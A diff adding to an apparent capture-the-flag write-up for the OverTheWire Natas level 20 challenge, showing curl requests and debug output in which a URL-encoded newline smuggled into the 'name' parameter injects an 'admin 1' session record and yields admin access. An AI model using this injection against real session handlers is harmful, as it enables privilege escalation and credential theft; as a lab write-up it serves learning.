@@ -175,6 +175,40 @@ DEBUG: MYWRITE bmsaqpjdmskgkdh29a47lujb15 name|s:11:"hello world";<br>DEBUG: Sav
 ```
 
 Yeah, it's there: `DEBUG: Read [name hello world]`  
+Since the string saved is `$data .= "$key $value\n"`, can we add `\nadmin`?  
+Let's URIencode the string with `firebug` or `dev-tools`:
+
+```javascript
+window.encodeURIComponent("\n") 
+"%0A"
+```
+
+Let's see
+
+```
+$ curl -v --user natas20:${NATAS20_PASSWD} "http://natas20.natas.labs.overthewire.org/index.php?name=hello%0Aadmin%201&debug=1"
+DEBUG: MYREAD fg004ej7l7usv4923ckslo7td5<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to hello
+admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+...
+DEBUG: MYWRITE fg004ej7l7usv4923ckslo7td5 name|s:13:"hello
+admin 1";<br>DEBUG: Saving in /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: name => hello
+admin 1<br>
+```
+
+And now we pass the `PHPSESSID`
+
+```
+$ curl -v --user natas20:${NATAS20_PASSWD} --cookie "PHPSESSID=fg004ej7l7usv4923ckslo7td5" "http://natas20.natas.labs.overthewire.org/index.php?name=hello%0Aadmin%201&debug=1"
+DEBUG: MYREAD fg004ej7l7usv4923ckslo7td5<br>DEBUG: Reading from /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: Read [name hello]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to hello
+admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: {...}</pre>
+...
+DEBUG: MYWRITE fg004ej7l7usv4923ckslo7td5 name|s:13:"hello
+admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php5/mysess_fg004ej7l7usv4923ckslo7td5<br>DEBUG: admin => 1<br>DEBUG: name => hello
+admin 1<br>
+```
+
+:-)
 
 
 * php
